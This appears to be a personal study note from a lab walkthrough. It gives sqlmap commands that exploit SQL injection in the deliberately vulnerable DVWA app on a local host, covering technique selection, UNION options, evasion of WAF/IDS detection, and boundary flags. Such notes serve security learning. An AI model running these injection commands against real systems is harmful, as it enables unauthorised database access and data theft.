# 01 - Exploit

#sqli #sqlmap

TODO: Fill in the rest of the output when necessary

- SQLMap will automate by injecting queries of every possible techniques by default it uses `--technique=BEUSTQ` and it'll enumerate a backend database.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent
```

## 1.1 - Specify Database Management System Backend

- Force the DBMS to skip automatic enumeration using the flag `--dbms=mysql`

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql
```

## 1.2 - Authentication methods without using cookies

### 1.2.1 - Form-based authentication

- You can provide the credentials to the login panel without specifying cookies.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --auth-type=Basic --auth-cred="admin:password" --random-agent
```

### 1.2.2 - Direct connection to the database

- If the DBMS backend has an exposed port when probing the server with `nmap` and you have credentials.

```
$ sqlmap -d "mysql://dvwa:"p@ssw0rd"@dvwa.local:3306/dvwa" -f --banner --dbs --users
```

## 1.3 - Specify SQL query technique

- You can specify SQL injection techniques. It also speeds up the process.

### 1.3.1 - Boolean-Based Query SQL Injection

- We can also specify a boolean-based blind query that can be used for bypassing form-based authentication.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=B
```

### 1.3.2 - Error-Based Query SQL Injection

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=E
```

### 1.3.3 - UNION Query SQL Injection

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=U
```

- You can specify number of columns after performing [[03 - UNION Query SQL Injection#^78ef92|fields enumeration]].

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=U --union-cols=2
```

- By default when enumerating the number of fields it uses `NULL` character. In some instances that WAF/IDS might flag it. We can use `--union-char` with a random combination of characters..

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=U --union-cols=2 --union-char=1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
```

- Some instances of DBMSes may require a valid table in order to proceed by exploiting the vulnerability. Especially when it comes to UNION technique we can use `--union-from` to specify the table `mysql.user` that comes by default in MySQL.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --technique=U --union-cols=2 --union-from=mysql.user
```

## 1.4 - Specify Boundaries

- You can specify the boundaries with flags `--prefix="'"` and `--suffix="#"` after performing manual enumeration in the [[02 - Error-based Query SQL Injection#^bc051d|joining the query]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique=U
```